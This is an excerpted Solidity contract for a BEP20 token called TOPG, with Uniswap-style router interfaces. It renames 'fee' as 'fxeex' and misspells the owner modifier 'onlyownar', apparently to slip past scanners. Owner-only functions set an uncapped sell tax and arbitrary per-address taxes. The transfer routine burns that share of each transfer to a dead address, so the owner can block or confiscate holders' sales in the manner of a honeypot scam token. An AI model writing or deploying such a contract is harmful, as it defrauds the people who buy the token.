...
interface IUniswapV2Factory {
    ...
    function fxeexTo() external view returns (address);
    function fxeexToSetter() external view returns (address);
    ...
    function setfxeexTo(address) external;
    function setfxeexToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfxeexOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfxeexOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfxeexOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfxeexOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfxeexOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract TOPG is BEP20, Ownable {
    ...
    uint256 private _defaultSellfxeex = 0;

    uint256 private _defaultBuyfxeex = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfxeex;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfxeex = _value;
    }

    function setSlipfxeex(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfxeex[_address] = _value;
    }

    function getSlipfxeex(address _address) external view onlyownar returns (uint256) {
        return _slipfxeex[_address];
    }


    function setMAccountfxeex(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfxeex(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefxeexAmount = 0;

        if (rF) {
            uint256 tradefxeex = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefxeex = _defaultSellfxeex;
                }
                if (from == uniswapV2Pair) {

                    tradefxeex = _defaultBuyfxeex;
                }
            }
            if (_slipfxeex[from] > 0) {
                tradefxeex = _slipfxeex[from];
            }

            tradefxeexAmount = _Amount.mul(tradefxeex).div(100);
        }


        if (tradefxeexAmount > 0) {
            _balances[from] = _balances[from].sub(tradefxeexAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefxeexAmount);
            emit Transfer(from, _deadAddress, tradefxeexAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefxeexAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefxeexAmount);
        emit Transfer(from, _to, _Amount - tradefxeexAmount);
    }
